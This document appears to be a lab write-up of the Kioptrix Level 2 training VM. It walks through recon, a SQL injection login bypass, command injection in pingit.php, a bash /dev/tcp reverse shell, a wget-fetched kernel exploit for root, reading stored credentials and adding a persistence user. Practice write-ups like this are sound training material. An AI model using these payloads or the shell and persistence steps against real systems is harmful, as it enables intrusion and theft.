## 📌 Kioptrix Level 2 – Full Walkthrough

### 🧠 Overview

* **Machine**: Kioptrix Level 2
* **IP**: 192.168.3.130
* **Goal**: Root access
* **Difficulty**: Beginner → Intermediate

---

## 🔍 Reconnaissance

### Network Discovery

```
netdiscover
```

### Full Port Scan

```
nmap -T4 -p- -n --min-rate 1500 192.168.3.130 -oN ports.txt
```

### Service Enumeration

```
nmap -sC -sV -T4 -p22,80,111,443,626,631,3306 192.168.3.130 -oN service.txt
```

---

## 🧾 Key Findings

* Apache 2.0.52 (outdated)
* PHP 4.3.9 (very old)
* MySQL exposed
* Login panel available
* No HTTPS
* Weak SSH crypto

---

## 🌐 Web Enumeration

Login page:

```
http://192.168.3.130/index.php
```

---

## 💥 Initial Access – SQL Injection

### Payload:

```
Username: admin' --
Password: anything
```

### Result:

✔️ Authentication bypass
✔️ Access to admin panel

---

## 🧨 Command Injection

### Vulnerable endpoint:

```
pingit.php
```

### Payload:

```
127.0.0.1; whoami
```

### Output:

```
apache
```

✔️ Remote Code Execution confirmed

---

## 🐚 Reverse Shell

### Listener:

```
nc -lvnp 4444
```

### Payload:

```
127.0.0.1; bash -i >& /dev/tcp/192.168.3.x/4444 0>&1
```

✔️ Shell obtained

---

## ⚙️ Privilege Escalation

### System:

```
Linux 2.6.9-55.EL
```

### Exploit:

CVE-2009-2698

---

### File Transfer

**Attacker:**

```
cd /opt
python3 -m http.server 8000
```

**Target:**

```
cd /tmp
wget http://192.168.3.x:8000/exploit2.c
```

---

### Compile & Run (IMPORTANT: on target)

```
gcc exploit2.c -o exploit2
./exploit2
```

---

## 🎉 Root Access

```
whoami
root
```

---

## 🔥 Post-Exploitation

### Read DB credentials:

```
cat /var/www/html/index.php
```

Found:

```
john : hiroshima
```

---

### Create persistence user:

```
useradd hacker
passwd hacker
usermod -aG wheel hacker
```

---

## 🚨 Challenges Faced

* Empty exploit file (0 bytes)
* HTTP 404 errors
* Wrong working directory
* Compiling on attacker instead of target
* Wrong command chaining (`|` vs `;`)

---

## 🧠 Key Lessons

* Always verify files (`wc -l`)
* Understand attacker vs target roles
* Debug step-by-step
* Small mistakes break everything
* Manual exploitation builds real skill

---

## 🏁 Conclusion

This lab demonstrates a full real-world attack chain:

**SQL Injection → Command Injection → Reverse Shell → Kernel Exploit → Root**

